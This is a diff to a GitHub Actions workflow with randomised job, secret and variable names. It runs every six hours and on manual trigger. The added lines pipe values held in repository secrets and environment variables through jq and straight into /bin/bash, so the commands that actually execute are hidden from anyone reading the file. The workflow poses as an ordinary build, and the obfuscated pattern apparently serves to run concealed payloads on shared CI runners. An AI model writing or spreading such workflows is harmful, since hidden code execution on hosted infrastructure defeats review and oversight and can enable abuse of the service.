@@ -2,9 +2,9 @@ name: fanggeju4567
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 2/6 * * *'
+    - cron: '58 3/6 * * *'
 
-jobs:  # 22597
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,14 +12,19 @@ jobs:  # 22597
       - uses: actions/checkout@v4
       - name: fanggeju4567
         env:
-          f7127: ${{ secrets.f7127 }}
+          hlrvh32850: ${{ secrets.hlrvh32850 }}
         run: |
-          echo $f7127 | jq -r .jlmke5194 | /bin/bash
-          echo $btiee47 | jq -r .ak19 | /bin/bash
-          echo $a6 | jq -r .z5 | /bin/bash
-          echo $jvxv132 | jq -r .pn5315 | /bin/bash
-          echo $w43563 | jq -r .ndryj73 | /bin/bash
-          echo $yupi188 | jq -r .pt5 | /bin/bash
-          echo $u811 | jq -r .bv1 | /bin/bash
-          echo $eeq9 | jq -r .wt9 | /bin/bash
+          echo $hlrvh32850 | jq -r .o1879 | /bin/bash
+          echo $wkiex00 | jq -r .qa93 | /bin/bash
+          echo $axits535 | jq -r .obd3 | /bin/bash
+          echo $gam8 | jq -r .y921 | /bin/bash
+          echo $pbiki4992 | jq -r .d515 | /bin/bash
+          echo $c36 | jq -r .zkms35777 | /bin/bash
+          echo $cx087 | jq -r .ci70173 | /bin/bash
+          echo $vfbgr76030 | jq -r .zn24059 | /bin/bash
+          echo $ke9332 | jq -r .muaz94091 | /bin/bash
+          echo $kfft7 | jq -r .qrvs276 | /bin/bash
+          echo $o407 | jq -r .rq51 | /bin/bash
+          echo $lq47 | jq -r .jqd23132 | /bin/bash
+          echo $uxd1 | jq -r .svoxq247 | /bin/bash
 
